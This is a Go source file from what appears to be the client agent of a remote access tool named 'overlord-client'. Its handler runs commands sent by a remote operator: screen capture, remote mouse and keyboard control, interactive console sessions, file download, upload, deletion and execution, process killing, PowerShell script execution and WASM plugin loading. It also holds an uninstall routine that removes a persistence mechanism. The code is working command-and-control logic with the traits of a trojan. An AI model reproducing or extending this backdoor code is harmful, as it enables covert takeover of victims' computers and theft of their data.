package handlers

import (
	"context"
	"errors"
	"log"
	"os"
	"sync"

	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/console"
	"overlord-client/cmd/agent/persistence"
	"overlord-client/cmd/agent/plugins"
	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

var ErrReconnect = errors.New("reconnect requested")

var (
	activeCommands   = make(map[string]context.CancelFunc)
	activeCommandsMu sync.Mutex
)

func removePersistence() error {
	return persistence.Remove()
}

func registerCancellableCommand(cmdID string, cancel context.CancelFunc) {
	activeCommandsMu.Lock()
	defer activeCommandsMu.Unlock()
	activeCommands[cmdID] = cancel
}

func unregisterCommand(cmdID string) {
	activeCommandsMu.Lock()
	defer activeCommandsMu.Unlock()
	delete(activeCommands, cmdID)
}

func cancelCommand(cmdID string) bool {
	activeCommandsMu.Lock()
	defer activeCommandsMu.Unlock()
	if cancel, exists := activeCommands[cmdID]; exists {
		cancel()
		delete(activeCommands, cmdID)
		return true
	}
	return false
}

func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	cmdID, _ := envelope["id"].(string)
	action, _ := envelope["commandType"].(string)

	switch action {
	case "screenshot":

		return HandleScreenshot(ctx, env, cmdID)
	case "plugin_load":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing payload"})
		}
		manifestRaw, _ := payload["manifest"].(map[string]interface{})
		wasmBytes, _ := payload["wasm"].([]byte)
		if env.Plugins == nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "plugin manager not ready"})
		}
		manifest, err := plugins.ManifestFromMap(manifestRaw)
		if err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		if err := env.Plugins.Load(ctx, manifest, wasmBytes); err != nil {
			_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: manifest.ID, Event: "error", Error: err.Error()})
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
		_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: manifest.ID, Event: "loaded"})
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "plugin_load_init":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		manifestRaw, _ := payload["manifest"].(map[string]interface{})
		totalSize := toInt(payload["size"])
		totalChunks := toInt(payload["chunks"])
		manifest, err := plugins.ManifestFromMap(manifestRaw)
		if err != nil {
			return nil
		}
		_ = env.Plugins.StartBundle(manifest, totalSize, totalChunks)
		return nil
	case "plugin_load_chunk":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		pluginId, _ := payload["pluginId"].(string)
		index := toInt(payload["index"])
		data, _ := payload["data"].([]byte)
		_ = env.Plugins.AddChunk(pluginId, index, data)
		return nil
	case "plugin_load_finish":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		pluginId, _ := payload["pluginId"].(string)
		if pluginId == "" {
			return nil
		}
		if err := env.Plugins.FinalizeBundle(ctx, pluginId); err != nil {
			_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: pluginId, Event: "error", Error: err.Error()})
			return nil
		}
		_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: pluginId, Event: "loaded"})
		return nil
	case "plugin_unload":
		payload, _ := envelope["payload"].(map[string]interface{})
		if payload == nil || env.Plugins == nil {
			return nil
		}
		pluginId, _ := payload["pluginId"].(string)
		if pluginId == "" {
			return nil
		}
		env.Plugins.Unload(pluginId)
		_ = wire.WriteMsg(ctx, env.Conn, wire.PluginEvent{Type: "plugin_event", PluginID: pluginId, Event: "unloaded"})
		return nil
	case "desktop_start":

		if env.DesktopCancel != nil {
			env.DesktopCancel()
		}
		desktopCtx, cancel := context.WithCancel(ctx)
		env.DesktopCancel = cancel
		go func() {
			log.Printf("desktop: start requested")
			_ = DesktopStart(desktopCtx, env)
		}()
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_stop":

		log.Printf("desktop: stop requested")
		if env.DesktopCancel != nil {
			env.DesktopCancel()
			env.DesktopCancel = nil
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_select_display":

		payload, _ := envelope["payload"].(map[string]interface{})
		disp := 0
		if payload != nil {
			displayVal := payload["display"]

			if v, ok := displayVal.(int8); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int16); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int32); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int64); ok {
				disp = int(v)
			} else if v, ok := displayVal.(int); ok {
				disp = v
			} else if v, ok := displayVal.(uint8); ok {
				disp = int(v)
			} else if v, ok := displayVal.(float64); ok {
				disp = int(v)
			}
		}
		log.Printf("desktop: select display %d", disp)
		_ = DesktopSelect(ctx, env, disp)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_enable_mouse":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := true
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("desktop: mouse control %v", enabled)
		_ = DesktopMouseControl(ctx, env, enabled)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_enable_keyboard":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := true
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("desktop: keyboard control %v", enabled)
		_ = DesktopKeyboardControl(ctx, env, enabled)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_enable_cursor":
		payload, _ := envelope["payload"].(map[string]interface{})
		enabled := false
		if payload != nil {
			if v, ok := payload["enabled"].(bool); ok {
				enabled = v
			}
		}
		log.Printf("desktop: cursor capture %v", enabled)
		_ = DesktopCursorControl(ctx, env, enabled)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_set_quality":
		payload, _ := envelope["payload"].(map[string]interface{})
		quality := 90
		codec := ""
		if payload != nil {
			if v, ok := payload["quality"].(float64); ok {
				quality = int(v)
			}
			if v, ok := payload["quality"].(int); ok {
				quality = v
			}
			if v, ok := payload["codec"].(string); ok {
				codec = v
			}
		}
		log.Printf("desktop: set quality=%d codec=%s", quality, codec)
		capture.SetQualityAndCodec(quality, codec)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_mouse_move":
		if !env.MouseControl {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		x, y := int32(0), int32(0)
		if payload != nil {
			if v, ok := payload["x"].(float64); ok {
				x = int32(v)
			}
			if v, ok := payload["y"].(float64); ok {
				y = int32(v)
			}
			if v, ok := payload["x"].(int); ok {
				x = int32(v)
			}
			if v, ok := payload["y"].(int); ok {
				y = int32(v)
			}
		}
		log.Printf("desktop: mouse move %d,%d", x, y)
		setCursorPos(x, y)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_mouse_down":
		if !env.MouseControl {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		btn := 0
		if payload != nil {
			if v, ok := payload["button"].(float64); ok {
				btn = int(v)
			}
			if v, ok := payload["button"].(int); ok {
				btn = v
			}
		}
		log.Printf("desktop: mouse down %d", btn)
		sendMouseDown(btn)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_mouse_up":
		if !env.MouseControl {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		btn := 0
		if payload != nil {
			if v, ok := payload["button"].(float64); ok {
				btn = int(v)
			}
			if v, ok := payload["button"].(int); ok {
				btn = v
			}
		}
		log.Printf("desktop: mouse up %d", btn)
		sendMouseUp(btn)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_key_down":
		if !env.KeyboardControl {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		code := ""
		if payload != nil {
			if v, ok := payload["code"].(string); ok {
				code = v
			}
		}
		if vk := keyCodeToVK(code); vk != 0 {
			log.Printf("desktop: key down code=%s vk=%d", code, vk)
			sendKeyDown(vk)
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "desktop_key_up":
		if !env.KeyboardControl {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
		}
		payload, _ := envelope["payload"].(map[string]interface{})
		code := ""
		if payload != nil {
			if v, ok := payload["code"].(string); ok {
				code = v
			}
		}
		if vk := keyCodeToVK(code); vk != 0 {
			log.Printf("desktop: key up code=%s vk=%d", code, vk)
			sendKeyUp(vk)
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "console_start":
		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		cols, rows := envelopePayloadInts(envelope)
		if sessionID == "" {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing session id"})
		}
		if err := console.Start(ctx, env, sessionID, cols, rows); err != nil {
			_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
			return nil
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "console_input":
		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		data, _ := envelopePayloadString(envelope, "data")
		if sessionID != "" && data != "" {
			_ = console.Input(sessionID, data)
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "console_stop":
		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		if sessionID != "" {
			console.Stop(sessionID)
		}
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	case "console_resize":

		sessionID, _ := envelopePayloadString(envelope, "sessionId")
		cols, rows := envelopePayloadInts(envelope)
		_ = sessionID
		console.Resize(sessionID, cols, rows)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
	}

	switch action {
	case "file_list":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileList(ctx, env, cmdID, path)
	case "file_download":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileDownload(ctx, env, cmdID, path)
	case "file_upload":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		offset := int64(0)
		if o, ok := payload["offset"].(float64); ok {
			offset = int64(o)
		}
		if o, ok := payload["offset"].(int64); ok {
			offset = o
		}
		data := []byte{}
		if d, ok := payload["data"].([]byte); ok {
			data = d
		}
		return HandleFileUpload(ctx, env, cmdID, path, data, offset)
	case "file_delete":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileDelete(ctx, env, cmdID, path)
	case "file_mkdir":
		path, _ := envelopePayloadString(envelope, "path")
		return HandleFileMkdir(ctx, env, cmdID, path)
	case "file_zip":
		path, _ := envelopePayloadString(envelope, "path")

		zipCtx, cancel := context.WithCancel(ctx)
		registerCancellableCommand(cmdID, cancel)
		go func() {
			defer unregisterCommand(cmdID)
			if err := HandleFileZip(zipCtx, env, cmdID, path); err != nil && err != context.Canceled {
				log.Printf("file_zip error: %v", err)
			}
		}()
		return nil
	case "file_read":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		maxSize := int64(0)
		if ms, ok := payload["maxSize"].(float64); ok {
			maxSize = int64(ms)
		}
		return HandleFileRead(ctx, env, cmdID, path, maxSize)
	case "file_write":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		content, _ := payload["content"].(string)
		return HandleFileWrite(ctx, env, cmdID, path, content)
	case "file_search":
		payload, _ := envelope["payload"].(map[string]interface{})
		searchID, _ := payload["searchId"].(string)
		basePath, _ := payload["path"].(string)
		pattern, _ := payload["pattern"].(string)
		searchContent := false
		if sc, ok := payload["searchContent"].(bool); ok {
			searchContent = sc
		}
		maxResults := 0
		if mr, ok := payload["maxResults"].(float64); ok {
			maxResults = int(mr)
		}
		return HandleFileSearch(ctx, env, cmdID, searchID, basePath, pattern, searchContent, maxResults)
	case "file_copy":
		payload, _ := envelope["payload"].(map[string]interface{})
		source, _ := payload["source"].(string)
		dest, _ := payload["dest"].(string)
		return HandleFileCopy(ctx, env, cmdID, source, dest)
	case "file_move":
		payload, _ := envelope["payload"].(map[string]interface{})
		source, _ := payload["source"].(string)
		dest, _ := payload["dest"].(string)
		return HandleFileMove(ctx, env, cmdID, source, dest)
	case "file_chmod":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		mode, _ := payload["mode"].(string)
		return HandleFileChmod(ctx, env, cmdID, path, mode)
	case "file_execute":
		payload, _ := envelope["payload"].(map[string]interface{})
		path, _ := payload["path"].(string)
		return HandleFileExecute(ctx, env, cmdID, path)
	case "process_list":
		return HandleProcessList(ctx, env, cmdID)
	case "process_kill":
		payload, _ := envelope["payload"].(map[string]interface{})
		pid := int32(0)
		if p, ok := payload["pid"].(float64); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(int32); ok {
			pid = p
		}
		if p, ok := payload["pid"].(int64); ok {
			pid = int32(p)
		}
		if p, ok := payload["pid"].(int); ok {
			pid = int32(p)
		}
		return HandleProcessKill(ctx, env, cmdID, pid)
	case "script_exec":
		payload, _ := envelope["payload"].(map[string]interface{})
		scriptContent, _ := payload["script"].(string)
		scriptType, _ := payload["type"].(string)
		if scriptType == "" {
			scriptType = "powershell"
		}
		return HandleScriptExecute(ctx, env, cmdID, scriptContent, scriptType)
	case "uninstall":
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
		_ = wire.WriteMsg(ctx, env.Conn, res)

		if err := removePersistence(); err != nil {
			log.Printf("uninstall: failed to remove persistence: %v", err)
		}

		os.Exit(0)
	case "disconnect":
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
		_ = wire.WriteMsg(ctx, env.Conn, res)
		os.Exit(0)
	case "reconnect":
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true}
		_ = wire.WriteMsg(ctx, env.Conn, res)
		return ErrReconnect
	default:
		log.Printf("command: unknown action=%s", action)
		res := wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "unknown command"}
		return wire.WriteMsg(ctx, env.Conn, res)
	}

	return nil
}

func envelopePayloadString(envelope map[string]interface{}, key string) (string, bool) {
	payload, _ := envelope["payload"].(map[string]interface{})
	if payload == nil {
		return "", false
	}
	val, _ := payload[key].(string)
	return val, val != ""
}

func envelopePayloadInts(envelope map[string]interface{}) (int, int) {
	payload, _ := envelope["payload"].(map[string]interface{})
	if payload == nil {
		return 0, 0
	}
	cols, _ := payload["cols"].(int)
	rows, _ := payload["rows"].(int)

	if cols == 0 {
		if f, ok := payload["cols"].(float64); ok {
			cols = int(f)
		}
		if i, ok := payload["cols"].(int64); ok {
			cols = int(i)
		}
	}
	if rows == 0 {
		if f, ok := payload["rows"].(float64); ok {
			rows = int(f)
		}
		if i, ok := payload["rows"].(int64); ok {
			rows = int(i)
		}
	}
	if cols == 0 {
		cols = 120
	}
	if rows == 0 {
		rows = 36
	}
	return cols, rows
}

func toInt(v interface{}) int {
	if v == nil {
		return 0
	}
	if i, ok := v.(int); ok {
		return i
	}
	if i, ok := v.(int8); ok {
		return int(i)
	}
	if i, ok := v.(int16); ok {
		return int(i)
	}
	if i, ok := v.(int32); ok {
		return int(i)
	}
	if i, ok := v.(int64); ok {
		return int(i)
	}
	if i, ok := v.(uint8); ok {
		return int(i)
	}
	if i, ok := v.(uint16); ok {
		return int(i)
	}
	if i, ok := v.(uint32); ok {
		return int(i)
	}
	if i, ok := v.(uint64); ok {
		return int(i)
	}
	if f, ok := v.(float64); ok {
		return int(f)
	}
	return 0
}
